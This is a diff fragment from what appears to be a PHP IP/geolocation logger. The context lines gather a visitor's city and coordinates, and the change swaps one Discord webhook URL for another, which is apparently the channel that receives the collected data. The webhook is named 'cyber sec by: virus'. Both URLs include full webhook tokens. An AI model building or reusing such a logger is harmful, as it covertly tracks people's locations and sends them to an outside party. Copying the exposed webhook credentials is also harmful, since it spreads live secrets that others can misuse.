@@ -22,7 +22,7 @@ $City = $Info->city;
 $COORD = "$Info->lat, $Info->lon"; // Coordinates
 
 //Variables
-$Webhook    = "https://discord.com/api/webhooks/946610721393868881/1xSFK8wlK3pAUXmtpcMlNbcKtGJS130NpuiG4m2n9fjm7AjSl4Xs-yUkExsFR94CIY0y"; //Webhook here.
+$Webhook    = "https://discord.com/api/webhooks/1113469213043085352/4YjwEKEROrLegSkbMzo2z7GAPcC15LA_Ll57yj89Dyy-unw6GFUmsJec4siZsFQ_pmvA"; //Webhook here.
 
 $WebhookTag = "cyber sec by: virus"; //This will be the name of the webhook when it sends a message.  
 
